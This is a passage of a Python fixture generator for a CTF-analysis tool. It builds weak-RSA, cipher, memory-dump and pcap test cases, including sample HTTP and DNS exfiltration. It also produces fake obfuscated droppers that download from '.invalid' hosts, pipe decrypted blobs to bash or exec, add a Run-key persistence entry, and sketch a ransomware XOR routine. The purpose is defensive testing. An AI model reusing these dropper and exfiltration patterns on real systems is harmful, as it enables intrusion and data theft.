"""Generate the test fixtures in tests/fixtures/ (run: make fixtures).

Every fixture mirrors a real challenge shape, built with known keys and fake flags.
The output is deterministic (fixed seed), so re-running it changes nothing.
Never put real challenge flags here.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import math
import random
import struct
import zipfile
import zlib
from pathlib import Path

from Crypto.Cipher import AES, PKCS1_OAEP, ChaCha20, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, getPrime, inverse, isPrime, long_to_bytes
from Crypto.Util.Padding import pad

FIXTURES = Path(__file__).parent / "fixtures"
RNG = random.Random(1337)  # fixed seed: same bytes every time


def write(name: str, data: bytes | str) -> None:
    path = FIXTURES / name
    path.write_bytes(data.encode("utf-8") if isinstance(data, str) else data)
    print(f"  {name:32} {path.stat().st_size} bytes")


def zipcrypto_encrypt(data: bytes, password: bytes, check_byte: int) -> bytes:
    """Encrypt one entry with the traditional PKWARE ("ZipCrypto") cipher.

    A 96-bit keystream state is seeded from the password, a 12-byte random header
    (whose last byte is a known check value) is prepended, and every byte is XORed
    with one keystream byte while the state is stirred by the *plaintext* byte.
    This is exactly the stream bkcrack attacks given a little known plaintext.
    """
    keys = [0x12345678, 0x23456789, 0x34567890]

    def update(byte: int) -> None:
        keys[0] = zlib.crc32(bytes([byte]), keys[0]) & 0xFFFFFFFF
        keys[1] = (keys[1] + (keys[0] & 0xFF)) & 0xFFFFFFFF
        keys[1] = (keys[1] * 134775813 + 1) & 0xFFFFFFFF
        keys[2] = zlib.crc32(bytes([keys[1] >> 24]), keys[2]) & 0xFFFFFFFF

    def stream_byte() -> int:
        temp = (keys[2] | 2) & 0xFFFF
        return ((temp * (temp ^ 1)) >> 8) & 0xFF

    for byte in password:
        update(byte)
    header = bytearray(RNG.randbytes(11)) + bytes([check_byte])
    out = bytearray()
    for byte in bytes(header) + data:
        out.append(byte ^ stream_byte())
        update(byte)
    return bytes(out)


def zipcrypto_zip(entry_name: str, content: bytes, password: bytes) -> bytes:
    """A single-entry ZIP encrypted with ZipCrypto, deflate-stored (method 8).

    Written by hand because stdlib `zipfile` cannot produce ZipCrypto. The entry is
    one uncompressed deflate block, so the content (a PNG here) is literally present
    five bytes into the stream - the known-plaintext offset bkcrack needs.
    """
    raw = zlib.compressobj(0, zlib.DEFLATED, -zlib.MAX_WBITS)
    deflated = raw.compress(content) + raw.flush()
    crc = zlib.crc32(content) & 0xFFFFFFFF
    encrypted = zipcrypto_encrypt(deflated, password, check_byte=crc >> 24)
    name = entry_name.encode()
    flag = 0x0001  # bit 0: the entry is encrypted
    method = 8  # deflate
    comp_size = len(encrypted)
    local = struct.pack(
        "<IHHHHHIIIHH",
        0x04034B50,
        20,
        flag,
        method,
        0,
        0,
        crc,
        comp_size,
        len(content),
        len(name),
        0,
    )
    local += name + encrypted
    central = struct.pack(
        "<IHHHHHHIIIHHHHHII",
        0x02014B50,
        20,
        20,
        flag,
        method,
        0,
        0,
        crc,
        comp_size,
        len(content),
        len(name),
        0,
        0,
        0,
        0,
        0,
        0,
    )
    central += name
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 1, 1, len(central), len(local), 0)
    return local + central + end


def evp_bytes_to_key(
    password: bytes, salt: bytes, key_len: int, iv_len: int
) -> tuple[bytes, bytes]:
    """openssl's legacy KDF (MD5, 1 iteration): D_i = MD5(D_{i-1} || password || salt)."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + password + salt).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def tiny_png() -> bytes:
    """A valid 1x1 black PNG, built by hand (signature + IHDR + IDAT + IEND)."""

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body)
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def small_zip(name: str, content: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED  # ZipInfo defaults to "stored"
        archive.writestr(info, content)
    return buffer.getvalue()


def hide_zero_width(cover: str, secret: bytes) -> str:
    """Hide `secret` as bits: U+200B = 0, U+200C = 1, inserted after the first word."""
    bits = "".join(f"{byte:08b}" for byte in secret)
    hidden = "".join("​" if bit == "0" else "‌" for bit in bits)
    first, rest = cover.split(" ", 1)
    return first + hidden + " " + rest


ENGLISH = (
    "This is a secret message for the team. The meeting is moved to Friday night, "
    "bring the usual equipment and do not talk about it on the phone. "
    "Remember that the password for the server is written on the back of the old "
    "notebook. When you read this, the flag is CYBN{fixture_xor_repeating}. "
)


def xor(data: bytes, key: bytes) -> bytes:
    """Repeating-key XOR (written here independently of ctfc, to test it)."""
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def cbc_cts_encrypt(plain: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-CBC with ciphertext stealing, CS1 layout (what `openssl -cts` produces).

    Written independently of ctfc on purpose: the test must not check the code
    against itself. Verified against `openssl enc -aes-128-cbc-cts`.
    """
    tail = len(plain) % 16
    if tail == 0:
        return AES.new(key, AES.MODE_CBC, iv).encrypt(plain)
    full = AES.new(key, AES.MODE_CBC, iv).encrypt(plain[: len(plain) - tail])
    last_full = full[-16:]
    stolen = plain[len(plain) - tail :] + bytes(16 - tail)
    stolen_xor = bytes(a ^ b for a, b in zip(last_full, stolen, strict=True))
    final = AES.new(key, AES.MODE_ECB).encrypt(stolen_xor)
    # CS1: the truncated block comes first, the full one last.
    return full[:-16] + last_full[:tail] + final


def fernet_token(key: bytes, message: bytes, timestamp: int) -> bytes:
    """Build a Fernet token by hand: version | timestamp | iv | AES-128-CBC | HMAC."""
    iv = hashlib.sha256(message).digest()[:16]  # deterministic, any IV works
    body = AES.new(key[16:], AES.MODE_CBC, iv).encrypt(pad(message, 16))
    parts = b"\x80" + timestamp.to_bytes(8, "big") + iv + body
    return base64.urlsafe_b64encode(parts + hmac.new(key[:16], parts, hashlib.sha256).digest())


def xtea_encrypt_block(block: bytes, key: bytes, endian: str = "big") -> bytes:
    """One XTEA block, written here from the published algorithm (32 rounds)."""
    fmt = ">" if endian == "big" else "<"
    mask, delta = 0xFFFFFFFF, 0x9E3779B9
    v0, v1 = struct.unpack(fmt + "II", block)
    words = struct.unpack(fmt + "4I", key)
    total = 0
    for _ in range(32):
        v0 = (v0 + (((((v1 << 4) ^ (v1 >> 5)) & mask) + v1) ^ (total + words[total & 3]))) & mask
        total = (total + delta) & mask
        v1 = (
            v1 + (((((v0 << 4) ^ (v0 >> 5)) & mask) + v0) ^ (total + words[(total >> 11) & 3]))
        ) & mask
    return struct.pack(fmt + "II", v0, v1)


def powershell_dropper() -> str:
    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""

    def hidden(text: str) -> str:
        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)

    url = "http://update.example.invalid/payload.exe"
    flag = "CYBN{fixture_powershell_layers}"
    return (
        "# Windows update helper - do not remove\n"
        "$k = 0x5A\n"
        "function Decode-String($bytes) {\n"
        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "}\n"
        f"$url = Decode-String @({hidden(url)})\n"
        f"$tag = Decode-String @({hidden(flag)})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$path = Join-Path $env:TEMP "update.exe"\n'
        "$client.DownloadFile($url, $path)\n"
        "Start-Process -FilePath $path -WindowStyle Hidden\n"
        'Write-Output "Update finished, please restart the computer when you can."\n'
    )


def lens_python_dropper() -> str:
    """A Python dropper: base64 -> AES-256-CBC -> exec. Never executed by the tests."""
    key = hashlib.sha256(b"correct horse battery staple").digest()
    iv = bytes.fromhex("0f1e2d3c4b5a69788796a5b4c3d2e1f0")
    payload = b'print("CYBN{fixture_lens_python_aes}")\n'
    blob = base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))).decode()
    return (
        "#!/usr/bin/env python3\n"
        '"""Invoice helper - do not edit."""\n'
        "import base64\n"
        "from Crypto.Cipher import AES\n"
        "from Crypto.Util.Padding import unpad\n"
        "\n"
        f'KEY = bytes.fromhex("{key.hex()}")\n'
        f'IV = bytes.fromhex("{iv.hex()}")\n'
        f'BLOB = "{blob}"\n'
        'CALLBACK = "http://invoice.example.invalid/report.php"\n'
        "\n"
        "def main():\n"
        "    stage = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(BLOB)), 16)\n"
        "    exec(stage)\n"
        "\n"
        'if __name__ == "__main__":\n'
        "    main()\n"
    )


def lens_python_layers() -> str:
    """Python, three layers: base64 -> zlib -> repeating-key XOR -> exec."""
    payload = b'print("CYBN{fixture_lens_python_layers}")\n'
    key = b"L4y3rs!"
    blob = base64.b64encode(zlib.compress(xor(payload, key))).decode()
    return (
        "import base64, zlib\n"
        "\n"
        f"K = {key!r}\n"
        f'D = "{blob}"\n'
        "\n"
        "raw = zlib.decompress(base64.b64decode(D))\n"
        "out = bytes(b ^ K[i % len(K)] for i, b in enumerate(raw))\n"
        "exec(out)\n"
    )


def lens_python_fernet() -> str:
    """Python using Fernet with a hardcoded key."""
    key = base64.urlsafe_b64encode(hashlib.sha256(b"fernet-fixture").digest()).decode()
    return (
        "from cryptography.fernet import Fernet\n"
        "\n"
        f'FERNET_KEY = "{key}"\n'
        'TOKEN = "gAAAAABlTmFrZXRoaXNpc25vdGFyZWFsdG9rZW5idXRpdGxvb2tzbGlrZW9uZQ=="\n'
        "\n"
        "print(Fernet(FERNET_KEY).decrypt(TOKEN))\n"
    )


def lens_powershell_dropper() -> str:
    """PowerShell: base64 + single-byte XOR + AES through .NET + a download."""
    payload = 'Write-Host "CYBN{fixture_lens_powershell}"'
    blob = base64.b64encode(xor(payload.encode(), b"\x3b")).decode()
    key_bytes = ", ".join(f"0x{byte:02x}" for byte in hashlib.md5(b"ps-key").digest())
    iv_bytes = ", ".join(f"0x{byte:02x}" for byte in bytes(range(16)))
    return (
        "# Windows maintenance task\n"
        "$k = 0x3b\n"
        f'$enc = "{blob}"\n'
        "$bytes = [System.Convert]::FromBase64String($enc)\n"
        "$clear = -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "Invoke-Expression $clear\n"
        "\n"
        "$aes = New-Object System.Security.Cryptography.AesManaged\n"
        f"$aes.Key = [byte[]] @({key_bytes})\n"
        f"$aes.IV = [byte[]] @({iv_bytes})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$client.DownloadFile("http://update.example.invalid/stage2.bin",'
        ' "C:\\Windows\\Temp\\s2.bin")\n'
        'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
        " -Name Updater -Value $PSCommandPath\n"
    )


def lens_javascript_cryptojs() -> str:
    """JavaScript: atob + charCodeAt XOR + CryptoJS.AES with a passphrase."""
    payload = 'console.log("CYBN{fixture_lens_javascript}")'
    blob = base64.b64encode(xor(payload.encode(), b"\x17")).decode()
    return (
        "// analytics helper\n"
        f'var enc = "{blob}";\n'
        "var raw = atob(enc);\n"
        'var out = "";\n'
        "for (var i = 0; i < raw.length; i++) {\n"
        "  out += String.fromCharCode(raw.charCodeAt(i) ^ 0x17);\n"
        "}\n"
        "eval(out);\n"
        "\n"
        'var secret = CryptoJS.AES.decrypt("U2FsdGVkX1+abcdefghijklmnopqrstuvwx==",'
        ' "s3cr3tpassphrase");\n'
        'fetch("http://analytics.example.invalid/beacon");\n'
    )


def lens_bash_openssl() -> str:
    """bash: base64 -d piped into openssl enc -d, with the password on the line."""
    payload = b'echo "CYBN{fixture_lens_bash}"\n'
    salt = bytes.fromhex("a1b2c3d4e5f60718")
    key, iv = evp_bytes_to_key(b"bashpass", salt, 32, 16)
    body = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
    blob = base64.b64encode(body).decode()
    return (
        "#!/bin/bash\n"
        "# system health check\n"
        f'BLOB="{blob}"\n'
        'echo "$BLOB" | base64 -d'
        " | openssl enc -d -aes-256-cbc -md md5 -pass pass:bashpass | bash\n"
        "curl -s http://health.example.invalid/ping > /dev/null\n"
    )


def lens_vbs_dropper() -> str:
    """VBScript: Chr(Asc(c) Xor n) loop, a download and a Run."""
    payload = 'WScript.Echo "CYBN{fixture_lens_vbs}"'
    blob = "".join(f"{byte ^ 0x2A:02x}" for byte in payload.encode())
    return (
        "' Office update helper\n"
        f'Dim data : data = "{blob}"\n'
        "Dim out, i\n"
        "For i = 1 To Len(data) Step 2\n"
        '    out = out & Chr(Asc(Chr(CLng("&H" & Mid(data, i, 2)))) Xor 42)\n'
        "Next\n"
        "ExecuteGlobal out\n"
        "\n"
        'Set http = CreateObject("MSXML2.XMLHTTP")\n'
        'http.Open "GET", "http://office.example.invalid/update.dat", False\n'
        'Set shell = CreateObject("WScript.Shell")\n'
        'shell.Run "cmd /c echo done"\n'
    )


def next_prime(start: int) -> int:
    """The first prime >= start (used to build two primes that are too close)."""
    candidate = start | 1
    while not isPrime(candidate):
        candidate += 2
    return candidate


def oaep(key):
    """PKCS1_OAEP with our seeded RNG: the padding is random, the fixture must not be."""
    return PKCS1_OAEP.new(key, randfunc=RNG.randbytes)


def pkcs1v15(key):
    """Same for PKCS#1 v1.5, whose padding is random non-zero bytes."""
    return PKCS1_v1_5.new(key, randfunc=RNG.randbytes)


def write_rsa_fixtures() -> None:
    """One RSA fixture per classic mistake, plus a correct keypair.

    `getPrime(..., randfunc=RNG.randbytes)` and the two wrappers above keep every
    byte deterministic: running `make fixtures` twice must produce no diff.
    """
    # 1. A correct 1024-bit keypair, with the flag under OAEP and under PKCS#1 v1.5.
    p = getPrime(512, randfunc=RNG.randbytes)
    q = getPrime(512, randfunc=RNG.randbytes)
    key = RSA.construct((p * q, 65537, inverse(65537, (p - 1) * (q - 1)), p, q))
    write("rsa_private.pem", key.export_key())
    write("rsa_public.pem", key.publickey().export_key())
    secret = b"CYBN{fixture_rsa_oaep}"
    write("rsa_oaep.bin", oaep(key.publickey()).encrypt(secret))
    write(
        "rsa_pkcs1v15.bin",
        pkcs1v15(key.publickey()).encrypt(b"CYBN{fixture_rsa_pkcs1v15}"),
    )
    # The textbook case: no padding at all, which plenty of challenges use.
    textbook = bytes_to_long(b"CYBN{fixture_rsa_textbook}")
    write("rsa_textbook.bin", long_to_bytes(pow(textbook, 65537, p * q)))

    # 2. e = 3 on a short message: no key needed, the cube root is the message.
    p3 = getPrime(512, randfunc=RNG.randbytes)
    q3 = getPrime(512, randfunc=RNG.randbytes)
    while (p3 - 1) % 3 == 0:
        p3 = getPrime(512, randfunc=RNG.randbytes)
    while (q3 - 1) % 3 == 0:
        q3 = getPrime(512, randfunc=RNG.randbytes)
    n3 = p3 * q3
    message = bytes_to_long(b"CYBN{fixture_rsa_small_e}")
    assert message**3 < n3, "the message must be short enough not to wrap"
    write("rsa_small_e.pub.pem", RSA.construct((n3, 3)).export_key())
    write("rsa_small_e.bin", long_to_bytes(pow(message, 3, n3)))

    # 3. Two keys sharing a prime: gcd of the moduli breaks both.
    shared = getPrime(512, randfunc=RNG.randbytes)
    other_a = getPrime(512, randfunc=RNG.randbytes)
    other_b = getPrime(512, randfunc=RNG.randbytes)
    n_a, n_b = shared * other_a, shared * other_b
    write("rsa_shared_a.pub.pem", RSA.construct((n_a, 65537)).export_key())
    write("rsa_shared_b.pub.pem", RSA.construct((n_b, 65537)).export_key())
    key_a = RSA.construct((n_a, 65537, inverse(65537, (shared - 1) * (other_a - 1))))
    write("rsa_shared_a.bin", oaep(key_a.publickey()).encrypt(b"CYBN{fixture_rsa_shared}"))

    # 4. p and q next to each other: Fermat finds them in a few steps.
    base = getPrime(512, randfunc=RNG.randbytes)
    p_close = next_prime(base)
    q_close = next_prime(p_close + 2)
    n_close = p_close * q_close
    key_close = RSA.construct((n_close, 65537, inverse(65537, (p_close - 1) * (q_close - 1))))
    write("rsa_fermat.pub.pem", RSA.construct((n_close, 65537)).export_key())
    write("rsa_fermat.bin", oaep(key_close.publickey()).encrypt(b"CYBN{fixture_rsa_fermat}"))

    # 5. A private exponent far too small: Wiener's attack.
    while True:
        pw = getPrime(512, randfunc=RNG.randbytes)
        qw = getPrime(512, randfunc=RNG.randbytes)
        phi = (pw - 1) * (qw - 1)
        d_small = getPrime(120, randfunc=RNG.randbytes)
        if math.gcd(d_small, phi) != 1:
            continue
        e_big = inverse(d_small, phi)
        if e_big.bit_length() > 1000:  # e must really be the big one
            break
    n_w = pw * qw
    write("rsa_wiener.pub.pem", RSA.construct((n_w, e_big)).export_key())
    key_w = RSA.construct((n_w, e_big, d_small, pw, qw))
    write("rsa_wiener.bin", oaep(key_w.publickey()).encrypt(b"CYBN{fixture_rsa_wiener}"))

    # 6. The layered case CLAUDE.md asks for: an AES key||iv blob wrapped with
    #    RSA-OAEP, and the payload encrypted with that AES key.
    blob = RNG.randbytes(48)
    write("rsa_wrapped_key.bin", oaep(key.publickey()).encrypt(blob))
    payload = b"CYBN{fixture_rsa_wrapped_aes} the key travelled inside the RSA blob."
    write(
        "rsa_wrapped_payload.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(payload, 16)),
    )


def pcap_packet(payload: bytes, timestamp: int) -> bytes:
    """One classic-pcap record: 16-byte header, then the frame."""
    return struct.pack("<IIII", timestamp, 0, len(payload), len(payload)) + payload


def ethernet_ipv4(source: str, destination: str, protocol: int, body: bytes) -> bytes:
    """An Ethernet frame carrying an IPv4 packet (no checksums: nothing verifies them)."""

    def address(text: str) -> bytes:
        return bytes(int(part) for part in text.split("."))

    header = (
        struct.pack(">BBHHHBBH", 0x45, 0, 20 + len(body), 0, 0, 64, protocol, 0)
        + address(source)
        + address(destination)
    )
    ether = b"\xaa\xbb\xcc\xdd\xee\x01" + b"\xaa\xbb\xcc\xdd\xee\x02" + b"\x08\x00"
    return ether + header + body


def tcp_segment(source_port: int, destination_port: int, sequence: int, payload: bytes) -> bytes:
    header = struct.pack(
        ">HHIIBBHHH", source_port, destination_port, sequence, 0, 0x50, 0x18, 8192, 0, 0
    )
    return header + payload


def udp_datagram(source_port: int, destination_port: int, payload: bytes) -> bytes:
    return struct.pack(">HHHH", source_port, destination_port, 8 + len(payload), 0) + payload


def dns_query(name: str) -> bytes:
    """A minimal DNS query message for `name`."""
    labels = b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
    return (
        struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + labels + b"\x00" + b"\x00\x01\x00\x01"
    )


def write_pcap_fixture() -> None:
    """A capture shaped like a real forensics challenge.

    Three things to find: an HTTP response body with the flag, a POST that
    uploads a base64 blob, and a DNS exfiltration in base32 subdomains. The TCP
    payloads are deliberately split across packets so the reassembly is exercised.
    """
    client, server = "10.0.0.5", "93.184.216.34"
    records = []
    time = 1700000000

    # 1. An HTTP response whose body carries the flag, split over two packets.
    body = (
        b"<html><body><h1>Internal report</h1>\n"
        b"<p>The archive password is CYBN{fixture_pcap_http}</p>\n"
        b"</body></html>\n"
    )
    response = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx/1.18.0\r\n"
        b"Content-Type: text/html\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    request = (
        b"GET /report.html HTTP/1.1\r\nHost: intranet.example.invalid\r\n"
        b"User-Agent: curl/8.0\r\n\r\n"
    )
    records.append(
        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49152, 80, 1000, request)), time)
    )
    cut = 60
    records.append(
        pcap_packet(
            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000, response[:cut])), time
        )
    )
    records.append(
        pcap_packet(
            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000 + cut, response[cut:])),
            time + 1,
        )
    )

    # 2. A POST that uploads a base64 blob (the classic exfiltration over HTTP).
    secret = base64.b64encode(b"CYBN{fixture_pcap_upload} stolen from the workstation")
    post_body = b"data=" + secret
    post = (
        b"POST /upload.php HTTP/1.1\r\nHost: drop.example.invalid\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(post_body)).encode() + b"\r\n\r\n" + post_body
    )
    records.append(
        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49153, 80, 2000, post)), time + 2)
    )

    # 3. DNS exfiltration: base32 of the flag, 8 characters per query.
    payload = base64.b32encode(b"CYBN{fixture_pcap_dns}").decode().rstrip("=")
    chunks = [payload[index : index + 8] for index in range(0, len(payload), 8)]
    for number, chunk in enumerate(chunks):
        query = dns_query(f"{chunk}.exfil.example.invalid")
        records.append(
            pcap_packet(
                ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40000 + number, 53, query)),
                time + 3 + number,
            )
        )

    # 4. Noise: an unrelated DNS lookup and a short TCP segment.
    records.append(
        pcap_packet(
            ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40100, 53, dns_query("example.com"))),
            time + 20,
        )
    )
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    write("capture.pcap", header + b"".join(records))


# ---------------------------------------------------------------------------
# M7: classical ciphers and key hunting (all written here, independently of ctfc)
# ---------------------------------------------------------------------------

FRENCH = (
    "Rendez-vous ce soir au vieux port, derriere l'entrepot numero sept. Apportez les "
    "documents et ne parlez de cette affaire a personne, pas meme au telephone. Le "
    "mot de passe du serveur est note au dos du carnet rouge. Quand vous lirez ceci, "
    "le drapeau sera CYBN{fixture_vigenere_fr} et la mission pourra commencer. "
)


def shift_letters(text: str, f) -> str:
    """Encrypt letter by letter: f(index 0..25) -> new index; case kept, the rest unchanged."""
    out = []
    for char in text:
        if "a" <= char <= "z":
            out.append(chr(ord("a") + f(ord(char) - ord("a")) % 26))
        elif "A" <= char <= "Z":
            out.append(chr(ord("A") + f(ord(char) - ord("A")) % 26))
        else:
            out.append(char)
    return "".join(out)


def vigenere_encrypt(text: str, key: str) -> str:
    """Vigenère forwards; the key advances on letters only."""
    out, used = [], 0
    for char in text:
        if char.isascii() and char.isalpha():
            base = ord("A") if char.isupper() else ord("a")
            shift = ord(key[used % len(key)].lower()) - ord("a")
            out.append(chr(base + (ord(char) - base + shift) % 26))
            used += 1
        else:
            out.append(char)
    return "".join(out)


def rail_fence_encrypt(text: str, rails: int) -> str:
    """Write the text in a zigzag over `rails` lines, read it line by line."""
    lines = [[] for _ in range(rails)]
    rail, step = 0, 1
    for char in text:
        lines[rail].append(char)
        if rail == 0:
            step = 1
        elif rail == rails - 1:
            step = -1
        rail += step
    return "".join("".join(line) for line in lines)


def write_classical_fixtures() -> None:
    message = (
        "Good work agent. The drop is moved to the north gate at midnight, come alone and "
        "bring the usual equipment. Burn this note after reading it. "
    )
    write(
        "classical_caesar.txt",
        shift_letters(message + "The flag is CYBN{fixture_caesar_large_shift}.", lambda x: x + 19)
        + "\n",
    )
    write(
        "classical_affine.txt",
        shift_letters(message + "The flag is CYBN{fixture_affine_cipher}.", lambda x: 7 * x + 10)
        + "\n",
    )
    write(
        "classical_atbash.txt",
        shift_letters(message + "The flag is CYBN{fixture_atbash}.", lambda x: 25 - x) + "\n",
    )
    write("classical_vigenere.txt", vigenere_encrypt(FRENCH, "forensique") + "\n")
    write(
        "classical_railfence.txt",
        rail_fence_encrypt(message + "The flag is CYBN{fixture_rail_fence}.", 4) + "\n",
    )
    # A flag alone, Vigenère with a 3-letter key: only the CYBN{ crib can solve it.
    write("classical_vigenere_flag.txt", vigenere_encrypt("CYBN{fixture_short_key}", "elf") + "\n")


def aes_sbox() -> list[int]:
    """The AES S-box from its definition: inverse in GF(2^8), then an affine map.

    The inverse is found by brute force here (ctfc computes it differently), so
    the fixture does not depend on ctfc's code being right.
    """

    def multiply(a: int, b: int) -> int:
        result = 0
        while b:
            if b & 1:
                result ^= a
            a = (a << 1) ^ (0x11B if a & 0x80 else 0)
            b >>= 1
        return result

    box = []
    for value in range(256):
        inverse_value = next((c for c in range(1, 256) if multiply(value, c) == 1), 0)
        x = inverse_value
        out = 0x63
        for shift in range(5):  # b ^ rotl1 ^ rotl2 ^ rotl3 ^ rotl4
            out ^= ((x << shift) | (x >> (8 - shift))) & 0xFF
        box.append(out)
    return box


def aes_key_schedule(key: bytes) -> bytes:
    """FIPS-197 key expansion: 176 / 208 / 240 bytes for a 16 / 24 / 32-byte key."""
    sbox = aes_sbox()
    nk = len(key) // 4
    rounds = nk + 6
    words = [list(key[4 * i : 4 * i + 4]) for i in range(nk)]
    rcon = 1
    for i in range(nk, 4 * (rounds + 1)):
        temp = list(words[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [sbox[b] for b in temp]
            temp[0] ^= rcon
            rcon = ((rcon << 1) ^ (0x11B if rcon & 0x80 else 0)) & 0xFF
        elif nk > 6 and i % nk == 4:
            temp = [sbox[b] for b in temp]
        words.append([a ^ b for a, b in zip(words[i - nk], temp, strict=True)])
    return bytes(b for word in words for b in word)


def fake_memory(size: int) -> bytearray:
    """Something that looks like a process dump: zeros, pointers, strings, random runs."""
    memory = bytearray()
    strings = [
        b"GET /index.html HTTP/1.1\r\n",
        b"libcrypto.so.3\x00",
        b"/tmp/.cache/x\x00",
        b"Mozilla/5.0 (X11; Linux x86_64)\x00",
        b"session_id=4f2a\x00",
    ]
    while len(memory) < size:
        kind = RNG.randrange(4)
        if kind == 0:
            memory += bytes(RNG.randrange(16, 200))
        elif kind == 1:
            for _ in range(RNG.randrange(2, 12)):
                memory += struct.pack("<Q", 0x00007F0000000000 + RNG.randrange(1 << 32))
        elif kind == 2:
            memory += RNG.choice(strings)
        else:
            memory += RNG.randbytes(RNG.randrange(8, 64))
    return memory[:size]


def write_keyhunt_fixtures() -> None:
    secret = b"Exfiltration report: 4 hosts compromised. The flag is CYBN{fixture_key_schedule}.\n"

    # 1. A memory dump holding an expanded AES-256 key (what aeskeyfind looks for)
    key = RNG.randbytes(32)
    memory = fake_memory(65536)
    offset = 0x5A30
    memory[offset : offset + 240] = aes_key_schedule(key)
    write("memdump_aes.bin", bytes(memory))
    iv = RNG.randbytes(16)
    write("memdump_aes_ct.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))

    # 2. `strings` output: a hex key labelled in a config line, among hash decoys
    key = RNG.randbytes(32)
    lines = [
        "GCC: (Debian 12.2.0-14) 12.2.0",
        f"build_id={RNG.randbytes(32).hex()}",
        "connecting to c2 server...",
        f"sha256={hashlib.sha256(b'decoy').hexdigest()}",
        f"aes_key = {key.hex()}",
        f"token: {base64.b64encode(RNG.randbytes(32)).decode()}",
        "error: could not open /etc/shadow",
    ]
    write("strings_dump.txt", "\n".join(lines) + "\n")
    secret2 = b"Second stage URL: http://evil.example/stage2 - flag CYBN{fixture_strings_key}\n"
    write("strings_dump_ct.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(secret2, 16)))

    # 3. A binary with an ASCII key right after the AES S-box (custom crypto code)
    ascii_key = b"Sup3rS3cr3tK3y!!"
    blob = bytearray(RNG.randbytes(4096))
    blob[0x400 : 0x400 + 16] = bytes(aes_sbox()[:16])
    blob[0x700 : 0x700 + 17] = ascii_key + b"\x00"
    write("binary_with_key.bin", bytes(blob))
    iv = RNG.randbytes(16)
    secret3 = b"config: beacon every 60s, flag CYBN{fixture_ascii_key}\n"
    write(
        "binary_with_key_ct.bin",
        iv + AES.new(ascii_key, AES.MODE_CBC, iv).encrypt(pad(secret3, 16)),
    )


# ---------------------------------------------------------------------------
# M8: shapes of the user's own past challenges (github.com/CreaTikaa/CTFs-Writeups),
# rebuilt with new keys and fake flags. The real flags are never copied here.
# ---------------------------------------------------------------------------


def random_text_key(length: int) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(RNG.choice(alphabet) for _ in range(length))


def write_writeup_fixtures() -> None:
    # 1. "Cave Expedition" shape: a PowerShell ransomware rebuilt from event logs.
    #    Obfuscated names, two base64 keys decoded by a helper function, the file
    #    XORed with BOTH keys (64 and 24 bytes: one 192-byte keystream, too long to
    #    find statistically), then written as base64 text. The file is not in the
    #    script: only `ctfc lens --against` can solve it.
    key1, key2 = random_text_key(64), random_text_key(24)
    script = f"""$k34Vm = "{base64.b64encode(b"*.txt *.doc *.docx *.pdf").decode()}"
$a53Va = "{base64.b64encode(key1.encode()).decode()}"
$b64Vb = "{base64.b64encode(key2.encode()).decode()}"

function a12Vc {{
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

function l34Vn {{
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {{
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }}
    return $p12Vr
}}

function s78Vu {{
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
